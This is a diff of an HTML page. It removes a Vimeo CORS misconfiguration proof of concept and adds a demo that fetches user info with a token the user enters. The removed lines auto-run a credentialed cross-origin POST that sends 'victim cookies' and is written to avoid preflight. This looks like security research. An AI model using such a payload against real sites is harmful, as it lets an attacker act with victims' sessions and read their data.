@@ -1,28 +1,43 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Vimeo CORS PoC (No Preflight)</title>
+  <meta charset="UTF-8" />
+  <title>Vimeo API Token Demo</title>
 </head>
 <body>
-  <h1>Vimeo CORS Misconfiguration PoC (Simple Request)</h1>
-  <pre id="output">Waiting...</pre>
+  <h1>Vimeo API User Info Demo</h1>
+  <button id="fetchBtn">Fetch Vimeo User Info</button>
+  <pre id="output">Click the button to enter your token and fetch data.</pre>
 
   <script>
-    (async () => {
-      try {
-        const resp = await fetch("https://arclight.vimeo.com/add/player-stats?beacon=1&session-id=ee5275ad972ec12f2849f06e704a09b60c4cea741755882610", {
-          method: "POST",
-          credentials: "include", // include victim cookies
-          // ❌ no headers that cause preflight
-          body: '[{"autoplay":true,"viewer_id":244943635,"name":"cors-nopreflight"}]'
-        });
-
-        const text = await resp.text();
-        document.getElementById("output").textContent = text;
-      } catch (e) {
-        document.getElementById("output").textContent = "Request failed: " + e;
+    document.getElementById('fetchBtn').addEventListener('click', () => {
+      const token = prompt('Please enter your Vimeo JWT token:');
+      if (!token) {
+        alert('Token is required to proceed.');
+        return;
       }
-    })();
+
+      fetch('https://api.vimeo.com/me', {
+        headers: {
+          'Authorization': 'Bearer ' + token,
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log('User Info:', data);
+        document.getElementById('output').textContent = JSON.stringify(data, null, 2);
+      })
+      .catch(error => {
+        console.error('Error fetching Vimeo user info:', error);
+        document.getElementById('output').textContent = 'Error: ' + error.message;
+      });
+    });
   </script>
 </body>
 </html>
